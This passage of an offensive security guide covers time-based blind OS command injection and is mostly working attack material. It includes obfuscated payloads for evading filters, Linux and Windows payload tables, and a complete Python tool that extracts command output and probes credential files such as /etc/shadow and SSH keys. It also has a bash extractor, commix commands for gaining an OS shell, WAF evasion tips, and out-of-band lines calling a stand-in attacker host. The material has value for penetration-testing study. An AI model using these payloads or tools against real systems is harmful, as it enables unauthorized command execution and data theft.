; perl -e 'select(undef,undef,undef,5)'

# Ruby delay
; ruby -e 'sleep(5)'

# PHP delay
; php -r 'sleep(5);'

# Busy-wait CPU loop (crude but works)
; for i in $(seq 1 9999999); do :; done
; awk 'BEGIN{for(i=0;i<20000000;i++){}}'
; python3 -c "sum(range(100000000))"
; perl -e '$x+=$_ for 1..100000000'

# Filesystem-based delay
; dd if=/dev/urandom of=/dev/null bs=1M count=100 2>/dev/null

# Obfuscated sleep
; sl'e'ep 5
; sl"e"ep 5
; s\leep 5
; /bin/sleep 5
; /???/sl??p 5
; $'\x73\x6c\x65\x65\x70' 5
; $(printf '\x73\x6c\x65\x65\x70') 5
; $(echo c2xlZXA= | base64 -d) 5
; $(rev<<<'peels') 5
; a=sl;b=eep;$a$b 5
; sl${NOPE}eep 5
; /b[i]n/s[l]eep 5
```

::

### When `ping` is Blocked

::collapsible

```bash [Ping Alternatives When Filtered]
# Sleep (primary alternative)
; sleep 5

# Obfuscated ping
; p'i'n'g' -c 5 127.0.0.1
; p\ing -c 5 127.0.0.1
; /bin/p?ng -c 5 127.0.0.1
; $(printf '\x70\x69\x6e\x67') -c 5 127.0.0.1
; pin${x}g -c 5 127.0.0.1
; /???/pi?g -c 5 127.0.0.1

# traceroute (slow by nature)
; traceroute -m 5 192.0.2.1 2>/dev/null

# arping (if available)
; arping -c 5 127.0.0.1

# hping3 (if available)
; hping3 -1 -c 5 127.0.0.1

# fping
; fping -c 5 127.0.0.1

# nping (nmap)
; nping --icmp -c 5 127.0.0.1
```

::

### When Both `sleep` and `ping` are Blocked

```bash [When Both Primary Delays are Blocked]
# bash built-in read (no external command)
; read -t 5 < /dev/null

# bash /dev/tcp hang (no external command)
; bash -c 'echo > /dev/tcp/192.0.2.1/80' 2>/dev/null

# Pure bash busy-wait with timing
; SECONDS=0; while [ $SECONDS -lt 5 ]; do :; done

# dd-based delay
; dd if=/dev/zero of=/dev/null bs=1 count=1 2>/dev/null & sleep_pid=$!; kill -STOP $sleep_pid; read -t 5; kill $sleep_pid

# Language interpreters
; python3 -c "__import__('time').sleep(5)"
; perl -e 'select(undef,undef,undef,5)'
; ruby -e 'sleep(5)'
; php -r 'usleep(5000000);'
; node -e "var w=Date.now();while(Date.now()-w<5000){}"
; lua -e "local t=os.clock();while os.clock()-t<5 do end"

# CPU-intensive loops
; awk 'BEGIN{for(i=0;i<30000000;i++){}}'
; python3 -c "[x for x in range(100000000)]"
; perl -e 'my $s=time;while(time-$s<5){}'

# Using find with deliberate slowness
; find / -name "nonexistent_file_12345" 2>/dev/null
# (searches entire filesystem — takes several seconds)

# Using tar on large directories
; tar cf /dev/null / 2>/dev/null
# (traverses entire filesystem)

# Connection-based timeout
; timeout 5 bash -c 'cat < /dev/null'
; nc -l -p 1 -w 5 2>/dev/null
```

### Space Bypass in Delay Commands

```bash [Space Bypass for Timing Payloads]
# Using $IFS
;sleep${IFS}5
;ping${IFS}-c${IFS}5${IFS}127.0.0.1
;read${IFS}-t${IFS}5${IFS}x

# Using brace expansion
;{sleep,5}
;{ping,-c,5,127.0.0.1}
;{read,-t,5,x}

# Using tab (%09)
;sleep%095
;ping%09-c%095%09127.0.0.1

# Using $IFS with specific value
;IFS=,;`sleep,5`

# Using redirection
;sleep<5
# (doesn't actually work for sleep, but useful concept)

# Hex space
;sleep$'\x20'5
;sleep$'\t'5

# Combining techniques
;s\leep${IFS}5
;$'\x73\x6c\x65\x65\x70'${IFS}5
;{s\leep,5}
```

---

## Automation Scripts

### Python Time-Based Extractor

```python [timebased_extractor.py]
#!/usr/bin/env python3
"""
Time-Based Blind Command Injection Data Extractor
Extracts data character by character using timing side-channels
"""
import requests
import time
import string
import argparse
import sys
import urllib3
urllib3.disable_warnings()

class TimeBasedExtractor:
    def __init__(self, url, param, method='GET', cookie=None,
                 headers=None, data=None, delay=3, threshold=None,
                 proxy=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.delay = delay
        self.threshold = threshold
        self.session = requests.Session()
        self.session.verify = False

        if cookie:
            self.session.headers['Cookie'] = cookie
        if headers:
            for h in headers:
                k, v = h.split(':', 1)
                self.session.headers[k.strip()] = v.strip()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.data_template = data
        self.baseline = self._measure_baseline()
        if not self.threshold:
            self.threshold = self.baseline + (self.delay * 0.7)

        print(f"[*] Baseline response time: {self.baseline:.2f}s")
        print(f"[*] Delay: {self.delay}s")
        print(f"[*] Detection threshold: {self.threshold:.2f}s")

    def _measure_baseline(self, samples=5):
        """Measure average baseline response time."""
        times = []
        for _ in range(samples):
            start = time.time()
            self._send("normalvalue")
            elapsed = time.time() - start
            times.append(elapsed)
            time.sleep(0.2)
        avg = sum(times) / len(times)
        return avg

    def _send(self, payload):
        """Send injection payload to target."""
        try:
            if self.method == 'GET':
                params = {self.param: payload}
                return self.session.get(self.url, params=params, timeout=self.delay + 15)
            else:
                post_data = {}
                if self.data_template:
                    for pair in self.data_template.split('&'):
                        k, v = pair.split('=', 1)
                        post_data[k] = v
                post_data[self.param] = payload
                return self.session.post(self.url, data=post_data, timeout=self.delay + 15)
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            print(f"  [!] Request error: {e}")
            return None

    def _timed_send(self, payload):
        """Send payload and measure response time."""
        start = time.time()
        self._send(payload)
        elapsed = time.time() - start
        return elapsed

    def detect(self):
        """Test if time-based injection is possible."""
        print("\n[*] Testing time-based injection...")
        separators = [
            (';', 'semicolon'),
            ('|', 'pipe'),
            ('&', 'ampersand'),
            ('&&', 'AND'),
            ('||', 'OR'),
            ('%0a', 'newline'),
            ('$(', 'dollar_paren'),
            ('`', 'backtick'),
        ]

        for sep, name in separators:
            if sep == '$(':
                payload = f"test{sep}sleep {self.delay})"
            elif sep == '`':
                payload = f"test{sep}sleep {self.delay}{sep}"
            else:
                payload = f"test{sep} sleep {self.delay}"

            elapsed = self._timed_send(payload)
            detected = elapsed >= self.threshold
            status = "✅ DETECTED" if detected else "❌ No delay"
            print(f"  [{name:12s}] {elapsed:.2f}s {status}")

            if detected:
                # Validate with shorter delay
                if sep == '$(':
                    val_payload = f"test{sep}sleep 1)"
                elif sep == '`':
                    val_payload = f"test{sep}sleep 1{sep}"
                else:
                    val_payload = f"test{sep} sleep 1"

                val_time = self._timed_send(val_payload)
                if val_time < self.threshold:
                    print(f"  [✓] Validated! Separator '{sep}' works")
                    return sep, name
                else:
                    print(f"  [?] Validation inconclusive (short delay also slow)")

            time.sleep(0.5)

        print("  [!] No time-based injection detected with standard payloads")
        return None, None

    def extract_length(self, command, separator=';'):
        """Extract the length of command output."""
        print(f"\n[*] Extracting length of: {command}")

        low, high = 0, 100
        while low < high:
            mid = (low + high) // 2
            payload = f"test{separator} if [ $({command} | wc -c) -gt {mid} ]; then sleep {self.delay}; fi"
            elapsed = self._timed_send(payload)

            if elapsed >= self.threshold:
                low = mid + 1
                sys.stdout.write(f"\r  Length > {mid}")
            else:
                high = mid
                sys.stdout.write(f"\r  Length <= {mid}")
            sys.stdout.flush()
            time.sleep(0.3)

        # wc -c includes newline, so actual length = low - 1
        length = low - 1 if low > 0 else 0
        print(f"\r  [+] Length: {length} characters")
        return length

    def extract_char_linear(self, command, position, separator=';',
                            charset=None):
        """Extract a single character using linear search."""
        if charset is None:
            charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + '._-/:@#$%^&*()+=[]{}|\\<>?,~ '

        for char in charset:
            escaped_char = char
            if char in ["'", '"', '\\', '`', '$', '!']:
                escaped_char = '\\' + char

            payload = (f"test{separator} if [ \"$({command} | cut -c{position})\" = "
                       f"\"{escaped_char}\" ]; then sleep {self.delay}; fi")
            elapsed = self._timed_send(payload)

            if elapsed >= self.threshold:
                return char
            time.sleep(0.2)

        return None

    def extract_char_binary(self, command, position, separator=';'):
        """Extract a single character using binary search on ASCII value."""
        low, high = 32, 126

        while low < high:
            mid = (low + high) // 2
            payload = (f"test{separator} if [ $({command} | cut -c{position} | "
                       f"od -A n -td1 | tr -d ' ') -gt {mid} ]; then sleep {self.delay}; fi")
            elapsed = self._timed_send(payload)

            if elapsed >= self.threshold:
                low = mid + 1
            else:
                high = mid
            time.sleep(0.2)

        if 32 <= low <= 126:
            return chr(low)
        return None

    def extract_string(self, command, separator=';', method='binary',
                       max_length=None):
        """Extract full command output string."""
        if max_length is None:
            max_length = self.extract_length(command, separator)
            if max_length == 0:
                print("  [!] Zero length — command may not exist or no output")
                return ""

        print(f"[*] Extracting output of: {command}")
        print(f"[*] Method: {method} search")
        result = ""

        for pos in range(1, max_length + 1):
            if method == 'binary':
                char = self.extract_char_binary(command, pos, separator)
            else:
                char = self.extract_char_linear(command, pos, separator)

            if char is None:
                print(f"\n  [!] Could not extract position {pos}")
                break

            result += char
            sys.stdout.write(f"\r  [+] Extracted: {result}")
            sys.stdout.flush()

        print(f"\n  [✓] Result: {result}")
        return result

    def extract_file_line(self, filepath, line_num, separator=';',
                          method='binary'):
        """Extract a specific line from a file."""
        command = f"sed -n '{line_num}p' {filepath}"
        return self.extract_string(command, separator, method)

    def enumerate_files(self, directory, separator=';'):
        """Check for existence of common files."""
        files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts',
            '/etc/hostname', '/etc/os-release',
            '/root/.ssh/id_rsa', '/root/.ssh/authorized_keys',
            '/root/.bash_history', '/home/',
            '/var/www/html/index.php', '/var/www/html/config.php',
            '/var/www/html/.env', '/var/www/html/wp-config.php',
            '/proc/version', '/proc/self/environ',
            '/.dockerenv', '/app/.env',
        ]

        print(f"\n[*] Checking file existence...")
        for filepath in files:
            payload = f"test{separator} if [ -f {filepath} ]; then sleep {self.delay}; fi"
            elapsed = self._timed_send(payload)
            exists = elapsed >= self.threshold
            status = "EXISTS" if exists else "not found"
            icon = "📄" if exists else "  "
            print(f"  {icon} {filepath}: {status}")
            time.sleep(0.3)


if __name__ == '__main__':
    p = argparse.ArgumentParser(description="Time-Based Blind CI Extractor")
    p.add_argument("-u", "--url", required=True, help="Target URL")
    p.add_argument("-p", "--param", required=True, help="Vulnerable parameter")
    p.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    p.add_argument("-c", "--cookie", help="Session cookie string")
    p.add_argument("-H", "--header", action="append", help="Custom header")
    p.add_argument("--data", help="POST data (key=val&key=val)")
    p.add_argument("-d", "--delay", type=int, default=3, help="Delay seconds")
    p.add_argument("--threshold", type=float, help="Detection threshold")
    p.add_argument("--proxy", help="Proxy URL")
    p.add_argument("--command", default="whoami", help="Command to extract output")
    p.add_argument("--separator", default=";", help="Working separator")
    p.add_argument("--search", default="binary", choices=["binary","linear"])
    p.add_argument("--detect-only", action="store_true", help="Only detect, don't extract")
    p.add_argument("--enum-files", action="store_true", help="Enumerate common files")
    args = p.parse_args()

    extractor = TimeBasedExtractor(
        url=args.url,
        param=args.param,
        method=args.method,
        cookie=args.cookie,
        headers=args.header,
        data=args.data,
        delay=args.delay,
        threshold=args.threshold,
        proxy=args.proxy,
    )

    if args.detect_only:
        sep, name = extractor.detect()
        if sep:
            print(f"\n[✓] Injection confirmed with separator: '{sep}' ({name})")
    elif args.enum_files:
        sep = args.separator
        extractor.enumerate_files('/', sep)
    else:
        sep = args.separator
        result = extractor.extract_string(args.command, sep, args.search)
        print(f"\n[*] Final result: {result}")
```

```bash [Extractor Usage Examples]
# Detect injection
python3 timebased_extractor.py -u "http://target.com/page" -p "input" --detect-only

# Extract whoami
python3 timebased_extractor.py -u "http://target.com/page" -p "input" --command "whoami"

# Extract with POST method
python3 timebased_extractor.py -u "http://target.com/api" -p "cmd" -m POST \
  --data "action=run&cmd=test" --command "whoami"

# Extract with authentication
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  -c "session=VALID_COOKIE" --command "id"

# Extract hostname
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  --command "hostname" --delay 5

# Extract /etc/passwd first line
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  --command "head -1 /etc/passwd"

# Enumerate files
python3 timebased_extractor.py -u "http://target.com/page" -p "input" --enum-files

# Use linear search (slower but handles more char sets)
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  --command "whoami" --search linear

# With proxy (Burp Suite)
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  --proxy "http://127.0.0.1:8080" --command "whoami"

# Different separator
python3 timebased_extractor.py -u "http://target.com/page" -p "input" \
  --separator "&&" --command "whoami"
```

### Bash One-Liner Extractor

```bash [bash_extractor.sh]
#!/bin/bash
# Quick time-based extraction via curl
# Usage: ./bash_extractor.sh <url> <param> <command> [separator] [delay]

URL="$1"
PARAM="$2"
CMD="$3"
SEP="${4:-;}"
DELAY="${5:-3}"
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ._-/:@"

echo "[*] Target: $URL"
echo "[*] Parameter: $PARAM"
echo "[*] Command: $CMD"
echo "[*] Separator: $SEP"
echo "[*] Delay: ${DELAY}s"
echo ""

RESULT=""
for pos in $(seq 1 50); do
  FOUND=false
  for ((i=0; i<${#CHARSET}; i++)); do
    CHAR="${CHARSET:$i:1}"
    ESCAPED_CHAR="$CHAR"

    PAYLOAD="test${SEP} if [ \"\$(${CMD} | cut -c${pos})\" = \"${ESCAPED_CHAR}\" ]; then sleep ${DELAY}; fi"
    ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

    START=$(date +%s%N)
    curl -s -o /dev/null "${URL}?${PARAM}=${ENCODED_PAYLOAD}" 2>/dev/null
    END=$(date +%s%N)

    ELAPSED=$(( (END - START) / 1000000 ))
    THRESHOLD=$(( DELAY * 700 ))

    if [ "$ELAPSED" -ge "$THRESHOLD" ]; then
      RESULT="${RESULT}${CHAR}"
      echo -ne "\r[+] Extracted: $RESULT"
      FOUND=true
      break
    fi
    sleep 0.1
  done

  if [ "$FOUND" = false ]; then
    break
  fi
done

echo ""
echo "[*] Final result: $RESULT"
```

```bash [Bash Extractor Usage]
chmod +x bash_extractor.sh

# Extract whoami
./bash_extractor.sh "http://target.com/page" "input" "whoami" ";" 3

# Extract hostname
./bash_extractor.sh "http://target.com/page" "input" "hostname" ";" 3

# Extract with different separator
./bash_extractor.sh "http://target.com/page" "input" "whoami" "&&" 5
```

### Timing Analysis with curl

```bash [Precision Timing with curl]
# Detailed timing breakdown for a single request
curl -s -o /dev/null -w "\
DNS Lookup:    %{time_namelookup}s\n\
TCP Connect:   %{time_connect}s\n\
TLS Handshake: %{time_appconnect}s\n\
TTFB:          %{time_starttransfer}s\n\
Total:         %{time_total}s\n\
HTTP Code:     %{http_code}\n\
Size:          %{size_download} bytes\n" \
"http://target.com/page?input=test%3B%20sleep%205"

# Compare baseline vs injected
echo "=== Baseline ==="
curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=normalvalue"

echo "=== Sleep 3 ==="
curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=test%3B%20sleep%203"

echo "=== Sleep 5 ==="
curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=test%3B%20sleep%205"

echo "=== Sleep 7 ==="
curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=test%3B%20sleep%207"

# Batch test with different separators
SEPS=(
  "%3B%20sleep%205"                  # ; sleep 5
  "%7C%20sleep%205"                  # | sleep 5
  "%26%20sleep%205"                  # & sleep 5
  "%26%26%20sleep%205"               # && sleep 5
  "%7C%7C%20sleep%205"               # || sleep 5
  "%60sleep%205%60"                  # `sleep 5`
  "%24(sleep%205)"                   # $(sleep 5)
  "%0asleep%205"                     # newline + sleep 5
)

for sep in "${SEPS[@]}"; do
  t=$(curl -s -o /dev/null -w "%{time_total}" "http://target.com/page?input=test${sep}")
  echo "Payload: ${sep} → ${t}s"
done
```

---

## Advanced Timing Techniques

### Differential Timing

Use mathematical relationships to increase confidence in results.

```bash [Differential Timing Method]
# Instead of fixed delays, use variable delays proportional to data

# Map character position to delay multiplier
# If first char of whoami output is 'a' → sleep 1
# If first char is 'b' → sleep 2
# If first char is 'c' → sleep 3
# Measure exact delay to determine character

; case $(whoami | cut -c1) in \
  a) sleep 1;; b) sleep 2;; c) sleep 3;; d) sleep 4;; \
  e) sleep 5;; f) sleep 6;; g) sleep 7;; h) sleep 8;; \
  i) sleep 9;; j) sleep 10;; k) sleep 11;; l) sleep 12;; \
  m) sleep 13;; n) sleep 14;; o) sleep 15;; p) sleep 16;; \
  q) sleep 17;; r) sleep 18;; s) sleep 19;; t) sleep 20;; \
  u) sleep 21;; v) sleep 22;; w) sleep 23;; x) sleep 24;; \
  y) sleep 25;; z) sleep 26;; \
  esac

# 18-second delay → character is 'r'
# More efficient: extract in groups using modular arithmetic

# ASCII value as delay (direct mapping)
; sleep $(whoami | cut -c1 | od -A n -td1 | tr -d ' ')
# If delay is 114 seconds → ASCII 114 = 'r'
# Too long! Use modular:
; sleep $(( $(whoami | cut -c1 | od -A n -td1 | tr -d ' ') - 96 ))
# For lowercase: a=1, b=2, ..., z=26
# Delay of 18 → 'r' (18th letter)
```

### Multiple Request Correlation

```bash [Correlated Timing Analysis]
# Send the same payload multiple times and average results
# Reduces false positives from network jitter

for attempt in 1 2 3; do
  echo -n "Attempt $attempt: "
  curl -s -o /dev/null -w "%{time_total}s" \
    "http://target.com/page?input=test%3B%20sleep%205"
  echo ""
done

# Statistical analysis
python3 << 'PYEOF'
import statistics

# Baseline times (no injection)
baseline = [0.234, 0.198, 0.267, 0.212, 0.241]

# Injected times (with sleep 5)
injected = [5.287, 5.312, 5.198, 5.401, 5.256]

print(f"Baseline: mean={statistics.mean(baseline):.3f}s, stdev={statistics.stdev(baseline):.3f}s")
print(f"Injected: mean={statistics.mean(injected):.3f}s, stdev={statistics.stdev(injected):.3f}s")
print(f"Difference: {statistics.mean(injected) - statistics.mean(baseline):.3f}s")
print(f"Expected delay: 5.000s")
print(f"Match: {'YES' if abs(statistics.mean(injected) - statistics.mean(baseline) - 5) < 1 else 'NO'}")
PYEOF
```

### Arithmetic-Based Delay (No sleep/ping)

```bash [Arithmetic Delay Techniques]
# Use shell arithmetic to create delays without sleep or ping

# SECONDS variable (bash built-in timer)
; SECONDS=0; while [ $SECONDS -lt 5 ]; do :; done

# Date-based wait loop
; end=$(($(date +%s) + 5)); while [ $(date +%s) -lt $end ]; do :; done

# /proc/uptime based
; start=$(cat /proc/uptime | cut -d. -f1); \
  while [ $(($(cat /proc/uptime | cut -d. -f1) - start)) -lt 5 ]; do :; done

# CPU spin loop (approximate timing)
; for i in $(seq 1 $((5000000 * 5))); do true; done

# Python one-liner without time module
; python3 -c "
import datetime
end = datetime.datetime.now() + datetime.timedelta(seconds=5)
while datetime.datetime.now() < end: pass
"

# Using /dev/random (blocks for entropy)
; head -c 1 /dev/random > /dev/null
# Unpredictable timing but causes a noticeable delay on low-entropy systems
```

### Conditional Delay Without `if`

```bash [Conditional Delay Without if Statement]
# Using && (AND) — delays only if condition is true
; [ "$(whoami)" = "root" ] && sleep 5
; test "$(whoami)" = "root" && sleep 5
; [ -f /etc/shadow ] && sleep 5

# Using || (OR) — delays only if condition is false
; [ "$(whoami)" = "root" ] || sleep 5

# Using expr
; expr "$(whoami | cut -c1)" = "r" > /dev/null && sleep 5

# Using grep exit code
; whoami | grep -q "root" && sleep 5
; whoami | grep -q "^r" && sleep 5

# Using awk
; echo $(whoami) | awk '/^root/{system("sleep 5")}'
; echo $(whoami) | awk '{if($1=="root")system("sleep 5")}'

# Using sed with execution
; whoami | sed -n '/^root/e sleep 5'

# Using case without if
; case $(whoami) in root) sleep 5;; *) true;; esac
; case $(whoami | cut -c1) in r) sleep 5;; esac

# Using find -exec
; find /etc/passwd -maxdepth 0 -exec sleep 5 \;

# Using xargs
; echo "root" | xargs -I{} sh -c '[ "$(whoami)" = "{}" ] && sleep 5'

# Ternary-style in bash
; $([ "$(whoami)" = "root" ] && echo "sleep 5" || echo "true")
```

---

## Handling Edge Cases

### Asynchronous / Background Execution

```bash [When Commands Execute Asynchronously]
# Problem: Server runs injected command in background
# sleep doesn't affect HTTP response time

# Solution 1: Use foreground-blocking commands
; ping -c 5 127.0.0.1              # Blocks until complete
; dd if=/dev/zero of=/dev/null bs=1M count=100 2>/dev/null  # CPU-bound blocking
; find / -name "nonexistent" 2>/dev/null  # Filesystem scan

# Solution 2: Redirect to detect via side effects
; sleep 5 && touch /tmp/ci_proof_$(date +%s)
; sleep 5 && echo "injected" >> /var/www/html/test.txt

# Solution 3: Switch to OOB
# If timing is unreliable, fall back to DNS/HTTP OOB
; nslookup async-test.ATTACKER.com
; curl http://ATTACKER.com/async-test
```

### High Latency / Unstable Networks

```bash [Handling Network Instability]
# Increase delay duration for better signal-to-noise ratio
; sleep 10                    # Use 10 instead of 3-5
; sleep 15                    # Even more distinguishable
; ping -c 15 127.0.0.1        # 15-second delay

# Multiple confirmation rounds
# Send same payload 3 times, all must show delay
for i in 1 2 3; do
  curl -s -o /dev/null -w "%{time_total}\n" \
    "http://target.com/page?input=test%3B%20sleep%2010"
done

# Use median instead of mean for analysis (outlier-resistant)
```

### Rate-Limited / WAF-Protected Targets

```bash [Rate Limit Awareness]
# Add delays between requests to avoid triggering rate limits
# In Python extractor, add sleep between each character attempt

# Rotate User-Agents
UA_LIST=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"
)
RANDOM_UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
curl -A "$RANDOM_UA" ...

# Use jitter (random delay between requests)
sleep $((RANDOM % 3 + 1))

# Proxy rotation
# Use multiple proxies to distribute requests
```

---

## Commix Integration

```bash [Commix Time-Based Commands]
# Automatic time-based detection
commix -u "http://target.com/page?input=test" --technique=T --batch

# Specify delay
commix -u "http://target.com/page?input=test" --technique=T --time-sec=5 --batch

# POST parameter
commix -u "http://target.com/api" --data="cmd=test" --technique=T --batch

# With authentication
commix -u "http://target.com/page?input=test" --cookie="session=VALID" --technique=T

# Get OS shell via time-based
commix -u "http://target.com/page?input=test" --technique=T --os-shell

# Execute specific command
commix -u "http://target.com/page?input=test" --technique=T --os-cmd="cat /etc/passwd"

# Higher level detection (more payloads)
commix -u "http://target.com/page?input=test" --technique=T --level=3

# With tamper scripts
commix -u "http://target.com/page?input=test" --technique=T --tamper=base64encode

# Through Burp proxy
commix -u "http://target.com/page?input=test" --technique=T \
  --proxy="http://127.0.0.1:8080"

# Force specific OS
commix -u "http://target.com/page?input=test" --technique=T --os=linux
commix -u "http://target.com/page?input=test" --technique=T --os=windows

# Combine time-based with other techniques
commix -u "http://target.com/page?input=test" --technique=TF --batch
# T = time-based, F = file-based
```

---

## Payload Quick Reference

### Linux Time-Based Payloads

| Category | Payload |
| --- | --- |
| Basic sleep | `; sleep 5` |
| Ping delay | `; ping -c 5 127.0.0.1` |
| Read timeout | `; read -t 5 < /dev/null` |
| Python delay | `; python3 -c "__import__('time').sleep(5)"` |
| Perl delay | `; perl -e 'sleep(5)'` |
| Ruby delay | `; ruby -e 'sleep(5)'` |
| PHP delay | `; php -r 'sleep(5);'` |
| Connection timeout | `; curl --connect-timeout 5 http://192.0.2.1 2>/dev/null` |
| CPU spin | `; for i in $(seq 1 99999999); do :; done` |
| Bash timer | `; SECONDS=0; while [ $SECONDS -lt 5 ]; do :; done` |
| Obfuscated sleep | `; sl'e'ep 5` |
| Hex sleep | `; $'\x73\x6c\x65\x65\x70' 5` |
| Base64 sleep | `; $(echo c2xlZXA= \| base64 -d) 5` |
| Reversed sleep | `; $(rev<<<'peels') 5` |
| Variable sleep | `; a=sl;b=eep;$a$b 5` |
| IFS space | `;sleep${IFS}5` |
| Brace expansion | `;{sleep,5}` |
| Conditional TRUE | `; [ 1 -eq 1 ] && sleep 5` |
| Conditional FALSE | `; [ 1 -eq 2 ] && sleep 5` |
| Char extraction | `; if [ "$(whoami\|cut -c1)" = "r" ]; then sleep 5; fi` |

### Windows Time-Based Payloads

| Category | Payload |
| --- | --- |
| Ping delay | `& ping -n 6 127.0.0.1 > nul` |
| Timeout | `& timeout /t 5 /nobreak > nul` |
| PowerShell sleep | `& powershell Start-Sleep 5` |
| Choice | `& choice /t 5 /d y > nul` |
| PS Thread.Sleep | `& powershell -c "[Threading.Thread]::Sleep(5000)"` |
| PS encoded | `& powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANQA=` |
| Caret bypass | `& p^i^n^g -n 6 127.0.0.1 > nul` |
| Var bypass | `& pin%x%g -n 6 127.0.0.1 > nul` |
| VBScript | `& mshta vbscript:Execute("WScript.Sleep 5000:close")` |
| Conditional | `& if "%USERNAME%"=="Administrator" ping -n 6 127.0.0.1 > nul` |
| PS conditional | `& powershell -c "if($env:USERNAME[0]-eq'A'){Start-Sleep 5}"` |
| File check | `& if exist C:\flag.txt ping -n 6 127.0.0.1 > nul` |

---

## Tools & Resources

### Primary Tools

::card-group
  ::card
  ---
  title: Commix
  icon: i-lucide-terminal
  to: https://github.com/commixproject/commix
  target: _blank
  ---
  Automated command injection exploitation tool with built-in time-based, file-based, and results-based techniques. Supports OS shell, tamper scripts, and multiple injection styles.
  ::

  ::card
  ---
  title: Burp Suite Intruder
  icon: i-lucide-target
  to: https://portswigger.net/burp
  target: _blank
  ---
  Use Intruder with time-based command injection wordlists. Configure response time columns to identify delayed responses automatically.
  ::

  ::card
  ---
  title: ffuf / wfuzz
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzers that can filter by response time. Use `-ft` (filter time) or `-mt` (match time) to identify delayed responses during mass fuzzing.
  ::

  ::card
  ---
  title: SecLists Command Injection
  icon: i-lucide-list
  to: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
  target: _blank
  ---
  Comprehensive wordlists including time-based command injection payloads for both Linux and Windows targets.
  ::

  ::card
  ---
  title: PayloadsAllTheThings
  icon: i-lucide-book-open
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
  target: _blank
  ---
  Extensive command injection payload repository with sections on time-based blind detection, filter bypasses, and OS-specific techniques.
  ::

  ::card
  ---
  title: Nuclei
  icon: i-lucide-radar
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based vulnerability scanner with command injection detection templates including time-based payloads. Use `nuclei -tags cmdi` for targeted scans.
  ::
::

### References

::field-group
  ::field{name="OWASP Command Injection" type="string"}
  Comprehensive guide on command injection vulnerabilities, prevention, and testing methods.
  `https://owasp.org/www-community/attacks/Command_Injection`
  ::

  ::field{name="PortSwigger Blind OS Command Injection" type="string"}
  Interactive labs and detailed explanations of time-based and OOB command injection techniques.
  `https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays`
  ::

  ::field{name="HackTricks Command Injection" type="string"}
  Extensive pentesting notes covering detection, exploitation, filter bypass, and data extraction.
  `https://book.hacktricks.wiki/en/pentesting-web/command-injection.html`
  ::

  ::field{name="HackTricks Bash Restrictions Bypass" type="string"}
  Techniques for bypassing restricted bash environments, character filters, and command blacklists.
  `https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/`
  ::

  ::field{name="CWE-78 OS Command Injection" type="string"}
  MITRE Common Weakness Enumeration entry for OS command injection with code examples and mitigations.
  `https://cwe.mitre.org/data/definitions/78.html`
  ::

  ::field{name="GTFOBins" type="string"}
  Curated list of Unix binaries exploitable for privilege escalation, file reads, command execution, and reverse shells.
  `https://gtfobins.github.io/`
  ::

  ::field{name="LOLBAS (Windows)" type="string"}
  Living Off The Land Binaries, Scripts, and Libraries for Windows — certutil, bitsadmin, mshta, regsvr32, and more.
  `https://lolbas-project.github.io/`
  ::

  ::field{name="RevShells Generator" type="string"}
  Online reverse shell payload generator supporting multiple languages and encoding options.
  `https://www.revshells.com/`
  ::
::

### Quick Reference Commands

```bash [One-Liners]
# Quick time-based detection
curl -s -o /dev/null -w "%{time_total}" "http://target.com/page?input=test%3Bsleep%205"

# Baseline comparison
echo "Baseline:"; curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=test"
echo "Injected:"; curl -s -o /dev/null -w "%{time_total}s\n" "http://target.com/page?input=test%3Bsleep%205"

# Mass separator test
for p in "%3Bsleep%205" "%7Csleep%205" "%26sleep%205" "%26%26sleep%205" "%7C%7Csleep%205" "%24(sleep%205)" "%60sleep%205%60" "%0asleep%205"; do
  echo -n "Payload $p: "
  curl -s -o /dev/null -w "%{time_total}s" "http://target.com/page?input=test${p}"
  echo ""
done

# Commix quick test
commix -u "http://target.com/page?input=test" --technique=T --batch --os-cmd="whoami"

# ffuf with time filter (show responses > 4 seconds)
ffuf -u "http://target.com/page?input=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection-commix.txt \
  -ft "<4000"

# Nuclei command injection scan
echo "http://target.com" | nuclei -tags cmdi -severity critical,high,medium
```